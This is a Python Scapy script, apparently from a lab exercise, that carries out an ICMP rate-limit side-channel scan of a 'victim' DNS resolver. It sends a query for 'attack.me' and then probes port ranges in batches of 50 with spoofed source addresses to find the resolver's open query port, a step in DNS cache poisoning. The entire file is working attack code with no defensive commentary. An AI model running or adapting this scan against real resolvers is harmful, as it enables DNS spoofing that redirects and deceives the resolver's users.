from scapy.all import *

import random

ICMP_LIMIT_RATE = 50
ICMP_REPLY_WAIT_TIME = .025
START_PORT = 52000
VICTIM_DOMAIN_NAME = "attack.me"

VICTIM_RESOLVER_IP = "10.13.37.9"
VICTIM_RESOLVER_PORT = 53

MY_IP = "10.13.37.6"
MY_SPORT = 9999

KNOWN_BAD_PORTS = [x for x in range(1, 1025)]


global_socket = conf.L2socket(iface='eth0')

def generate_random_ipv4():
    return "100.13." + str(random.randint(50, 230))+"." + str(random.randint(50, 230))


def send_initial_query():
    ip_layer = IP(dst=VICTIM_RESOLVER_IP, src=MY_IP)
    udp_layer = UDP(dport=VICTIM_RESOLVER_PORT, sport=MY_SPORT)
    dns_layer = DNS(rd=1, qd=DNSQR(qname=VICTIM_DOMAIN_NAME))
    packet = ip_layer / udp_layer / dns_layer
    send(packet)

def send_in_range_and_verify(ports):
    probe_packet = []
    for i in ports:
        ip_layer = IP(dst=VICTIM_RESOLVER_IP, src=generate_random_ipv4())
        udp_layer = UDP(dport=i, sport=RandShort())
        packet = Ether() / ip_layer / udp_layer
        probe_packet.append(raw(packet))

    for packet in probe_packet:
        global_socket.send(packet)

    # Verification Packet
    ip_layer = IP(dst=VICTIM_RESOLVER_IP)
    udp_layer = UDP(dport=1, sport=RandShort())
    verification_packet = Ether() / ip_layer / udp_layer

    reply = global_socket.sr1(verification_packet, timeout=ICMP_REPLY_WAIT_TIME, verbose=0)

    time.sleep(0.025)

    return True if reply else False

def main():
    send_initial_query()
    for offset in range(50):
        scan = [x for x in range(START_PORT+(50*offset), START_PORT+ICMP_LIMIT_RATE+(50*offset))]
        res = send_in_range_and_verify(scan)
        if res:
            print(f"Port Found in {START_PORT+(50*offset)} {START_PORT+ICMP_LIMIT_RATE+(50*offset)}")
        else:
            print(f"Port NOT Found in {START_PORT+(50*offset)} {START_PORT+ICMP_LIMIT_RATE+(50*offset)}")


main()